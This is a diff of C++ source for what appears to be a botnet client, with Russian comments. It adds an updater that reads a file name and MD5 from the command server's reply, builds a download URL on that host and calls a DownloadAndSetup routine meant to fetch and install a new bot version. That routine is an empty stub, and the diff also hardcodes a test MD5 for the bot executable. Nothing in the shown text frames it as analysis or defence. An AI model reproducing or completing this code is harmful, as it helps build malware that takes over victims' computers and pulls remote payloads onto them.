@@ -3,6 +3,7 @@
 
 #include "BotCore.h"
 #include "BotUtils.h"
+#include "HTTPConsts.h"
 #include "BotDef.h"
 
 
@@ -329,7 +330,7 @@ bool BOT::AddToAutoRun(PCHAR FileName)
 //----------------------------------------------------
 string BOT::BotExeMD5()
 {
-	string Result;
+	string Result = "507535f54ccf135f94e6c495994dcd7b"; // Для тестов левый
 
 	return Result;
 }
@@ -402,9 +403,30 @@ void TBotUpdater::Update(DWORD &UpdateInterval)
 
 	if (Done && !Buf.IsEmpty())
 	{
-        // Выполняем обновление
+		// Выполняем обновление
+		TBotStrings Values;
+		Values.SetText(Buf);
+
+		TURL URL;
+
+		URL.Host     = HTTP.Request.Host;
+		URL.Path     = "cfg";
+		URL.Document = Values.GetValue("file_name");
+
+		string FileURL = URL.URL();
+			   MD5     = Values.GetValue("md5");
+
+		// Загружаем и устанавливаем новую версию
+		DownloadAndSetup(FileURL, MD5);
     }
 
 	STR::Free(URL);
 
 }
+//----------------------------------------------------------
+
+void TBotUpdater::DownloadAndSetup(const string &FileURL, const string &FileName)
+{
+	// Функция загржает и устанавливает новую версию бота
+}
+//----------------------------------------------------------
